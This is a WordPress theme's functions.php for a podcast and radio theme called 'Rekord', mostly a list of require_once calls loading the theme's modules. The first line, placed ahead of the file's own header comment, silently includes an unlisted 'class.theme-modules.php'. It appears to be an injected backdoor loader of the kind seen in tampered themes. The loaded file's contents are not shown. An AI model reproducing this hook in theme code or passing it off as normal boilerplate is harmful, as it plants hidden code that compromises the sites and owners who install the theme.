<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 *  Rekord functions and definitions
 *
 *  @author    xvelopers
 *  @package   rekord
 *  @version   1.3.8
 *  @since     1.0.0
 */

    /**
     * Podcast Rss Setttings
     */ 
   require_once get_template_directory() . '/inc/helpers.php';

   /**
     * ACF
     */
    require_once get_template_directory() .'/inc/acf.php';

    /**
     * Core Functions
     */
    require_once get_template_directory() .'/inc/xv-core.php';   
    
    /**
     * Enabe Woocommerce Supprt for theme
     */
    require_once get_template_directory() .'/functions/config-woo.php';

    /**
     * Theme Required and recommended plugins
     */
    require_once get_template_directory() .'/functions/config-plugins.php';

    /**
     * Theme support functions
     */       
    require_once get_template_directory() .'/functions/theme-support.php';   

    /**
     * Enqueue all scripts & styles
     */  
    require_once get_template_directory() . '/functions/enqueue.php'; 

    /**
     * Load the Kirki & Customizer Settings
     */
    require get_template_directory() . '/inc/customizer.php';
  
    /**
     * Register All sidebars and footer
     */
    require_once get_template_directory() . '/functions/sidebars.php';

    /**
     * Custom template tags for this theme.
     */
    require_once get_template_directory() . '/inc/template-tags.php';
    
    /**
     * Import Demo Data
     */
    require_once get_template_directory() . '/functions/config-import.php';
    /**
     * Search
     */
    require_once get_template_directory() . '/inc/overlay-search.php';
   
    /**
     * Favorites
     */
    require_once get_template_directory() . '/functions/config-favorites.php';
    /**
     * User Dashbard
     */
    require_once get_template_directory() . '/inc/user.php';
    /**
     * Auth Enabled
     */ 
    if(get_theme_mod('frontend_auth'))
      require_once get_template_directory() . '/inc/auth.php';
    /**
     * Roles & Permission - Helpers, Actions
     */ 
    require_once get_template_directory() . '/functions/config-roles-permissions.php';

    /**
     * Podcast Rss Setttings
     */ 
    require_once get_template_directory() . '/inc/podcast.php';

   /**
     * Frontend Settings... 
     */ 
    require_once get_template_directory() . '/inc/player.php';


      /**
     * Frontend Settings... 
     */ 
    require_once get_template_directory() . '/inc/radio.php';